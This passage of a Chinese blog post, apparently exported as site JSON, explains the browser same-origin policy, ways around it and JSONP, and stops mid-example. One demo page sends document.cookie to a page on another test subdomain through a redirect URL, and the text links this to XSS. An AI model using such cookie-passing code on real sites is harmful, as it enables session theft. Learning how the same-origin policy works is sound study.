选项。</li>\n</ul>\n<p>Reference:</p>\n<p><code>&lt;白帽子讲web安全&gt;</code></p>\n<p><code>https://www.liaoxuefeng.com/wiki/1022910821149312/1023022332902400</code></p>\n<p><code>http://www.ruanyifeng.com/blog/2016/04/same-origin-policy.html</code></p>\n<p><code>https://www.cnblogs.com/sdcs/p/8484905.html</code></p>\n<p><code>https://blog.csdn.net/qq_38643434/article/details/81430528</code></p>\n<p><code>https://www.cnblogs.com/xiaohuochai/p/6568039.html</code></p>\n<p><code>https://www.k0rz3n.com/2019/03/07/JSONP%20%E5%8A%AB%E6%8C%81%E5%8E%9F%E7%90%86%E4%B8%8E%E6%8C%96%E6%8E%98%E6%96%B9%E6%B3%95/</code></p>\n<p><code>https://www.k0rz3n.com/2018/06/05/%E7%94%B1%E6%B5%85%E5%85%A5%E6%B7%B1%E7%90%86%E8%A7%A3JSONP%E5%B9%B6%E6%8B%93%E5%B1%95/</code></p>\n<p><code>https://www.freebuf.com/articles/web/70025.html</code></p>\n<p><code>https://www.anquanke.com/post/id/97671</code></p>\n<p><code>https://www.cnblogs.com/52php/p/5677775.html</code></p>\n<p><code>https://www.infosec-wiki.com/?p=455211</code></p>\n<p><code>https://blog.csdn.net/z69183787/article/details/78954325</code></p>\n<p><code>https://www.w3cschool.cn/fetch_api/fetch_api-lx142x8t.html</code></p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"1-前言\"><a href=\"#1-前言\" class=\"headerlink\" title=\"1@ 前言\"></a>1@ 前言</h2><p>前端尤其是 Js 越学越发觉得其灵活度是超出一般脚本的。这篇文章，记录下自己对同源策略和 JSONP 的学习，也供有需要的同学参阅。</p>\n<h2 id=\"2-同源策略\"><a href=\"#2-同源策略\" class=\"headerlink\" title=\"2@ 同源策略\"></a>2@ 同源策略</h2><p>想必搞安全的初期大都会读过道哥的那本<strong><code>白帽子</code></strong>,书里面靠前的位置就讲过同源策略，不过我想大部分人可能还是对这个概念了解的不是很透彻，我们一起再来温习温习。</p>\n<blockquote>\n<p>1995年，同源政策由 Netscape 公司引入浏览器。目前，所有浏览器都实行这个政策。</p>\n</blockquote>\n<blockquote>\n<p>同源策略 （Same Origin Policy）是一种约定。</p>\n<p>浏览器的同源策略，限制了来自不同源的 document 或脚本，对当前 document 读取或者设置某些属性。</p>\n<p>​                                                                                             ———- 《白帽子讲web安全》</p>\n</blockquote>\n<h3 id=\"2-1-介绍\"><a href=\"#2-1-介绍\" class=\"headerlink\" title=\"2.1 介绍\"></a>2.1 介绍</h3><p>那么，什么时候两个资源才算是同源呢？</p>\n<p>影响两个资源是否同源主要看以下字段是否相同，如果一致，则会被认为是同源的。</p>\n<ul>\n<li>host(域名或者IP地址)</li>\n<li>子域名</li>\n<li>端口</li>\n<li>协议</li>\n</ul>\n<p>举个简单的例子：</p>\n<p><code>http://test1.rt95.com/test.html</code></p>\n<p><code>http://test2.rt95.com/test.html</code></p>\n<p>上面两个资源就是不同源的，因为他们的子域名不同 。</p>\n<h3 id=\"2-2-限制范围\"><a href=\"#2-2-限制范围\" class=\"headerlink\" title=\"2.2 限制范围\"></a>2.2 限制范围</h3><p>当前，如果非同源，下面的行为会受到限制。</p>\n<figure class=\"highlight lsl\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs undefined\">（<span class=\"hljs-number\">1</span>） Cookie、LocalStorage 和 IndexDB 无法读取。<br><br>（<span class=\"hljs-number\">2</span>） DOM 无法获得。<br><br>（<span class=\"hljs-number\">3</span>） AJAX 请求不能发送。<br></code></pre></td></tr></table></figure>\n\n<h3 id=\"2-3-规避同源策略的方法\"><a href=\"#2-3-规避同源策略的方法\" class=\"headerlink\" title=\"2.3 规避同源策略的方法\"></a>2.3 规避同源策略的方法</h3><h4 id=\"1、Cookie\"><a href=\"#1、Cookie\" class=\"headerlink\" title=\"1、Cookie\"></a>1、Cookie</h4><p><strong>如果两个网页的一级域名相同，只是二级域名不同，可以通过设置document.domain 共享 Cookie</strong></p>\n<ul>\n<li>上面这句话其实略带迷惑性，容易想当然。其本质就是页面可以设置 document.domain 为当前子域或者比当前子域更高的域。而一个子域的 cookie 包含了其子域和所有比其更高的域的 cookie，下例实质上是间接设置了主站上的 cookie，而使得所有子域都能访问到 cookie。</li>\n</ul>\n<p>假如说我们现在有两个测试网站，仅仅是子域名不同，我们通过上面的原理来访问下 cookie 值。</p>\n<p>测试网站为阮大佬的博客和书籍页面。</p>\n<p>打开 <code>es6.ruanyifeng.com</code>,控制台改变域名：</p>\n<p> <img class=\"lazyload\" data-original=\"https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/jsonp/1.png\" src=\"data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==\" alt=\"1.png\"></p>\n<p>然后设置一个 cookie 值：</p>\n<p> <img class=\"lazyload\" data-original=\"https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/jsonp/2.png\" src=\"data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==\" alt=\"2.png\"></p>\n<p>继续到博客页面，控制台改变域名和之前相同，然后进行 cookie 访问：</p>\n<p><img class=\"lazyload\" data-original=\"https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/jsonp/3.png\" src=\"data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==\" alt=\"3.png\"></p>\n<p>这种方法只适用于 Cookie 和 iframe 的窗口，LocalStorage 和 IndexDB 不能使用此方法。</p>\n<p>一般浏览器前端设置 cookie 的插件，像 EditThisCookie 这种，还是后端设置 cookie，如果没有特殊的用处，都是将 cookie 的 domain 字段设置为当下所属的域，但是如果此域存在一个 xss, 组合利用的话，可以修改 cookie 让另一个子域跨域访问到。</p>\n<p>下面再给出一个比较有意思的跨域获取 cookie 的思路：</p>\n<ul>\n<li>现在在 cms1.test.ink 域下面有一个 1.html,内嵌一个 cms2.test.ink 的 2.html 页面:</li>\n</ul>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">html</span>&gt;</span><br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">head</span>&gt;</span><br><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">head</span>&gt;</span><br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">body</span>&gt;</span><br>    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">iframe</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">'http://cms2.test.ink/2.html'</span> <span class=\"hljs-attr\">width</span>=<span class=\"hljs-string\">'100'</span> <span class=\"hljs-attr\">height</span>=<span class=\"hljs-string\">'100'</span>&gt;</span> <span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">iframe</span>&gt;</span><br>    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">textarea</span> <span class=\"hljs-attr\">id</span>=<span class=\"hljs-string\">\"zhaochao\"</span>&gt;</span><br>    <span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">textarea</span>&gt;</span><br><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">body</span>&gt;</span><br><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">html</span>&gt;</span><br></code></pre></td></tr></table></figure>\n\n<ul>\n<li>而 cms2.test.ink 域下面的 2.html 内容如下，其内容是跳转到 cms1.test.ink 域下的 3.html，并且带上自己的cookie：</li>\n</ul>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">html</span>&gt;</span><br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">head</span>&gt;</span><br><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">head</span>&gt;</span><br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">body</span>&gt;</span><br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"javascript\"><br><span class=\"hljs-built_in\">window</span>.location=<span class=\"hljs-string\">\"http://cms1.test.ink/3.html?\"</span>+<span class=\"hljs-built_in\">document</span>.cookie;<br></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><br><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">body</span>&gt;</span><br><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">html</span>&gt;</span><br></code></pre></td></tr></table></figure>\n\n<ul>\n<li>cms1.test.ink 域下面的 3.html 用来接收跨域传递过来的参数，并写在父页面的文本框里：</li>\n</ul>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">html</span>&gt;</span><br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">head</span>&gt;</span><br><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">head</span>&gt;</span><br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">body</span>&gt;</span><br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"javascript\"><br><span class=\"hljs-built_in\">window</span>.parent.document.getElementById(<span class=\"hljs-string\">\"zhaochao\"</span>).value=<span class=\"hljs-built_in\">window</span>.location.toString().substring(<span class=\"hljs-built_in\">window</span>.location.toString().indexOf(<span class=\"hljs-string\">\"?\"</span>));<br></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><br><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">body</span>&gt;</span><br></code></pre></td></tr></table></figure>\n\n<ul>\n<li><p>访问 cms1.test.ink/1.html,内嵌 cms2.test.ink/2.html，带 cookie 跳转到 cms1.test.ink/3.html 接收参数，写到主页面。</p>\n<p><img class=\"lazyload\" data-original=\"https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/jsonp/22.png\" src=\"data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==\" alt=\"22.png\"></p>\n</li>\n</ul>\n<h4 id=\"2、iframe\"><a href=\"#2、iframe\" class=\"headerlink\" title=\"2、iframe\"></a>2、iframe</h4><p>如果两个网页不同源，那么就不能拿到对方的 dom ，像 iframe 和 window.open 窗口，与父窗口无法进行通信。</p>\n<p>像在父窗口上使用下述方法来获取 iframe 的标签，就会因为不同源而报错。（本地嵌入一个百度页面进行测试）</p>\n<p> <img class=\"lazyload\" data-original=\"https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/jsonp/4.png\" src=\"data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==\" alt=\"4.png\"></p>\n<p>如果父子窗口只是二级域名不同，可以效仿上一点 Cookie 的跨越访问那样，设置 <code>document.domain</code> 一致即可访问。</p>\n<p>下面介绍下完全不同源的网站进行跨域访问的三种方法。</p>\n<figure class=\"highlight xquery\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs undefined\">片段识别符（fragment identifier）<br><span class=\"hljs-keyword\">window</span><span class=\"hljs-built_in\">.name</span><br>跨文档通信API（Cross-<span class=\"hljs-keyword\">document</span> messaging）<br></code></pre></td></tr></table></figure>\n\n<h4 id=\"3、片段识别符\"><a href=\"#3、片段识别符\" class=\"headerlink\" title=\"3、片段识别符\"></a>3、片段识别符</h4><p>片段识别符（fragment identifier)也就是前端开发中所说的锚点，即 URL 的 <code>#</code> 之后的内容。如果知识改变片段识别符，页面不会重新刷新。</p>\n<p>这种父子间的访问方法已经浮出水面：父窗口向子窗口的片段标识符中写入数据，而子窗口可以通过创建一个监听 hash 值的方法来获取父窗口传过来的数据，从而达成通信。</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs javascript\"><span class=\"hljs-comment\">// 父窗口写入数据</span><br><span class=\"hljs-keyword\">var</span> src = originRL + <span class=\"hljs-string\">'#'</span> + data;<br>$(<span class=\"hljs-string\">'iframe'</span>).get(<span class=\"hljs-number\">0</span>).src = src；<br></code></pre></td></tr></table></figure>\n\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs javascript\"><span class=\"hljs-comment\">// 子窗口查看数据</span><br><span class=\"hljs-built_in\">window</span>.location.href； <span class=\"hljs-comment\">// # 之后有 data 的值</span><br></code></pre></td></tr></table></figure>\n\n<p> <img class=\"lazyload\" data-original=\"https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/jsonp/5.png\" src=\"data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==\" alt=\"5.png\"></p>\n<p> <img class=\"lazyload\" data-original=\"https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/jsonp/6.png\" src=\"data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==\" alt=\"6.png\"></p>\n<h4 id=\"4、window-name\"><a href=\"#4、window-name\" class=\"headerlink\" title=\"4、window.name\"></a>4、window.name</h4><p>window.name 这个属性有个特定就是，无论是否同源，只要在同一个窗口里，前一个网页设置了这个属性，后一个网页就可以读取到它。（这种方法只能是子窗口向父窗口发送数据）</p>\n<p>我们依旧拿上面的例子来演示：</p>\n<figure class=\"highlight xl\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs undefined\">在父窗口中打开子窗口，键入 <span class=\"hljs-function\"><span class=\"hljs-title\">window</span>.<span class=\"hljs-keyword\">name</span> 的值 -----&gt;</span><br>然后改变 <span class=\"hljs-function\"><span class=\"hljs-title\">window</span>.location 的值进入到父窗口  -----&gt;</span><br>父窗口中获得子窗口的标签，然后读取其 window.<span class=\"hljs-keyword\">name</span> 的值<br></code></pre></td></tr></table></figure>\n\n<p> <img class=\"lazyload\" data-original=\"https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/jsonp/7.png\" src=\"data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==\" alt=\"7.pg\"></p>\n<p> <img class=\"lazyload\" data-original=\"https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/jsonp/8.png\" src=\"data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==\" alt=\"8.png\"></p>\n<h4 id=\"5、window-postMessage\"><a href=\"#5、window-postMessage\" class=\"headerlink\" title=\"5、window.postMessage\"></a>5、window.postMessage</h4><p>上面的方法都属于程序猿们私下闲着没事干破解出来的，而 HTML5 为了解决这个问题。引入了一个全新的 API ：跨文档通信 API （Cross-document-messaging),它为 window 对象多增添了一个 window.postMessage() 的方法，允许跨窗口通信，不管是否同源。</p>\n<blockquote>\n<p>举例来说，父窗口<code>http://aaa.com</code>向子窗口<code>http://bbb.com</code>发消息，调用<code>postMessage</code>方法就可以了</p>\n</blockquote>\n<p>我们来看看 w3c 中定义 的 postMessage() 方法的定义</p>\n<blockquote>\n<p>targetWindow .postMessage（message，targetOrigin，[ transfer ]）</p>\n<ul>\n<li><p><em>targetWindow</em></p>\n<p>对将接收消息的窗口的引用。获得此类引用的方法包括：<code>Window.open</code> （生成一个新窗口然后引用它），<code>Window.opener</code> （引用产生这个的窗口），<code>HTMLIFrameElement.contentWindow</code>（<code>&lt;iframe&gt;</code>从其父窗口引用嵌入式），<code>Window.parent</code>（从嵌入式内部引用父窗口<code>&lt;iframe&gt;</code>）<code>Window.frames</code> +索引值（命名或数字）。</p>\n</li>\n<li><p><em>message</em></p>\n<p>要发送到其他窗口的数据。使用结构化克隆算法序列化数据。这意味着您可以将各种各样的数据对象安全地传递到目标窗口，而无需自己序列化。</p>\n</li>\n<li><p><em>targetOrigin</em></p>\n<p>指定要调度的事件的<code>targetWindow</code>的原点，可以是文字字符串<code>&quot;*&quot;</code>（表示没有首选项），也可以是URI。如果在计划调度事件时，<code>targetWindow</code>文档的方案，主机名或端口与<code>targetOrigin</code>提供的内容不匹配，则不会调度该事件；只有当所有的三个条件都匹配时，将调度该事件。该机制可以控制发送消息的位置；例如，如果<code>postMessage()</code>用于传输密码，则该参数必须是URI，其来源与包含密码的消息的预期接收者相同，以防止恶意第三方拦截密码。<strong>始终提供具体的targetOrigin，而不是*，如果您知道其他窗口的文档应该位于何处。未能提供特定目标会泄露您发送给任何感兴趣的恶意站点的数据。</strong></p>\n</li>\n<li><p><em>stransfer</em>（可选的）</p>\n<p>是与消息一起传输的<code>Transferable</code>对象序列。这些对象的所有权将提供给目标端，并且它们在发送端不再可用。</p>\n</li>\n</ul>\n</blockquote>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs javascript\"><span class=\"hljs-keyword\">var</span> popup = <span class=\"hljs-built_in\">window</span>.open(<span class=\"hljs-string\">'http://bbb.com'</span>, <span class=\"hljs-string\">'title'</span>);<br>popup.postMessage(<span class=\"hljs-string\">'Hello World!'</span>, <span class=\"hljs-string\">'http://bbb.com'</span>);<br></code></pre></td></tr></table></figure>\n\n<p>postMessage 的参数是：</p>\n<ul>\n<li>1、发送的内容</li>\n<li>2、接收消息的窗口源，设为 * 时，表示向所有窗口发送。</li>\n</ul>\n<p>父子窗口均可以通过监听 message 事件来获取消息：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs javascript\"><span class=\"hljs-built_in\">window</span>.addEventListener(<span class=\"hljs-string\">'message'</span>, <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\">e</span>) </span>&#123;<br>  <span class=\"hljs-built_in\">console</span>.log(e.data);<br>&#125;,<span class=\"hljs-literal\">false</span>);<br></code></pre></td></tr></table></figure>\n\n<p>message 事件相关的对象有下面属性：</p>\n<ul>\n<li><code>event.source</code>：对发送消息的<code>window</code>对象的引用，也就是想要给其发送消息的一方，即上面的 targetWindow。</li>\n<li><code>event.origin</code>: 调用当时发送消息的窗口的原点<code>postMessage</code>，即信息来源的一方。</li>\n<li><code>event.data</code>: 消息内容</li>\n</ul>\n<p>接下来我们创建一个父子窗口交互的代码示例：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs javascript\"><span class=\"hljs-comment\">// 父窗口 http://127.0.0.1/frametest/test.html</span><br> &lt;iframe src=<span class=\"hljs-string\">\"http://127.0.0.1:8086/child.html\"</span> frameborder=<span class=\"hljs-string\">\"0\"</span>&gt;<span class=\"xml\"><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">iframe</span>&gt;</span></span><br> <span class=\"xml\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"javascript\"><br>     <span class=\"hljs-built_in\">window</span>.addEventListener(<span class=\"hljs-string\">'message'</span>, receiveMessage);<br><br>     <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">receiveMessage</span>(<span class=\"hljs-params\">event</span>) </span>&#123;<br>         <span class=\"hljs-built_in\">document</span>.write(<span class=\"hljs-string\">'this is receiver\\'s receiving data'</span> + event.data);<br><br>      &#125;<br> </span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span></span><br></code></pre></td></tr></table></figure>\n\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs html\">// 子窗口 http://127.0.0.1:8086/child.html<br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"javascript\"><br>      <span class=\"hljs-built_in\">window</span>.addEventListener(<span class=\"hljs-string\">'message'</span>, receiveMessage);<br><br>      <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">receiveMessage</span>(<span class=\"hljs-params\">event</span>) </span>&#123;<br>          event.source.postMessage(<span class=\"hljs-string\">'message_received'</span>, event.origin);<br>          alert(event.data);<br><br>        &#125;<br></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><br></code></pre></td></tr></table></figure>\n\n<p>然后在父窗口向子窗口发送信息：(注意我们此时需要先拿到 iframe 标签，通过它来向子窗口发送数据)</p>\n<p><img class=\"lazyload\" data-original=\"https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/jsonp/9.png\" src=\"data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==\" alt=\"9.png\"></p>\n<p> <img class=\"lazyload\" data-original=\"https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/jsonp/10.png\" src=\"data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==\" alt=\"10.png\"></p>\n<p> <img class=\"lazyload\" data-original=\"https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/jsonp/11.png\" src=\"data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==\" alt=\"11.png\"></p>\n<h3 id=\"2-4-补充\"><a href=\"#2-4-补充\" class=\"headerlink\" title=\"2.4 补充\"></a>2.4 补充</h3><p>尽管有同源策略，但是在浏览器中，<code>&lt;script&gt;</code> <code>img</code> <code>iframe</code> <code>&lt;link&gt;</code> 等标签依旧可以跨域加载资源，不受同源策略的控制。一般都是带 <strong>src</strong> 属性的标签，它们加载资源时，其实是由浏览器发出了一次 GET 请求。</p>\n<p>除了上面规避同源策略的方法外，还有几种：</p>\n<ul>\n<li>flash插件发送 http 请求，但必须安装 flash ，和 flash 交互。而现在 flash 已经用的越来越少了，在这里就不细究，有兴趣的同学可以参考道哥书里面的第二章内容。</li>\n<li>可以在同源服务器下架设一个代理服务器来转发，代理服务器负责请求跨域内容，而 js 只负责接收即可。</li>\n<li>第三种方式即是我们下面要探讨的 JSONP。</li>\n</ul>\n<h2 id=\"3-JSONP-介绍\"><a href=\"#3-JSONP-介绍\" class=\"headerlink\" title=\"3@ JSONP 介绍\"></a>3@ JSONP 介绍</h2><p>​     JSONP 即 JSON with Padding（填充式 JSON），是应用 JSON 的一种新的方法，常用于服务器和客户端跨源通信，在后来的 Web 服务中非常流行。</p>\n<h3 id=\"3-1-基础知识\"><a href=\"#3-1-基础知识\" class=\"headerlink\" title=\"3.1 基础知识\"></a>3.1 基础知识</h3><p> JSONP 的基本思想就是，网页添加一个 <code>&lt;script&gt;</code> 标签，然后向服务器请求数据，服务器传送回来的数据放到请求时 <code>callback</code> 关键字函数中进行处理。这种方法不受同源策略的限制。JSONP 有个要求，就是只能用 GET请求，并且要求返回 Javascript，常见可以被浏览器解析为 js 的数据 mime 类型<a href=\"https://mathiasbynens.be/demo/javascript-mime-type\" target=\"_blank\" rel=\"noopener\">在这</a>,实际上也就是我们上面补充点中说的，<code>&lt;script&gt;</code> 等标签可以跨域加载资源。</p>\n<p>我们来看一个例子：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs javascript\"><span class=\"hljs-comment\">// 构造一个加载跨域数据的脚本，来读取当前价格指数</span><br> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">refreshPrice</span>(<span class=\"hljs-params\">data</span>) </span>&#123; <span class=\"hljs-comment\">//构造回调函数</span><br>            <span class=\"hljs-keyword\">var</span> p = $(<span class=\"hljs-string\">'p#content'</span>).get(<span class=\"hljs-number\">0</span>);<br>            p.innerHTML = <span class=\"hljs-string\">'当前价格'</span> +<br>                data[<span class=\"hljs-string\">'0000001'</span>].name + <span class=\"hljs-string\">': '</span> +<br>                data[<span class=\"hljs-string\">'0000001'</span>].price + <span class=\"hljs-string\">'；'</span> +<br>                data[<span class=\"hljs-string\">'1399001'</span>].name + <span class=\"hljs-string\">': '</span> +<br>                data[<span class=\"hljs-string\">'1399001'</span>].price;<br>        &#125;<br>  <span class=\"hljs-keyword\">var</span> js = <span class=\"hljs-built_in\">document</span>.createElement(<span class=\"hljs-string\">'script'</span>);<br>  head = $(<span class=\"hljs-string\">'head'</span>);<br>  js.src = <span class=\"hljs-string\">\"http://api.money.126.net/data/feed/0000001,1399001？callback=refreshPrice\"</span>;<br>  head.append(js);  <span class=\"hljs-comment\">// 添加标签，加载数据，触发回调函数</span><br></code></pre></td></tr></table></figure>\n\n<p> <img class=\"lazyload\" data-original=\"https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/jsonp/12.png\" src=\"data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==\" alt=\"12.png\"></p>\n<p>从这个例子我们也可以看出来，JSONP 由两部分组成：</p>\n<ul>\n<li>回调函数</li>\n<li>请求传入的数据</li>\n</ul>\n<p>再举一个我们生活中大概率会碰到的例子：百度。</p>\n<p>百度搜索框也是利用了 JSONP 的技术，我们可以通过下面的查询 URL 看出端倪。</p>\n<p><code>https://sp0.baidu.com/5a1Fazu8AA54nxGko9WTAnF6hhy/su?wd=西电&amp;&amp;cb=a</code></p>\n<p>结果为：</p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs json\">a(<br>&#123;<br>\"q\": \"西电\",<br>\"p\": false,<br>\"s\": 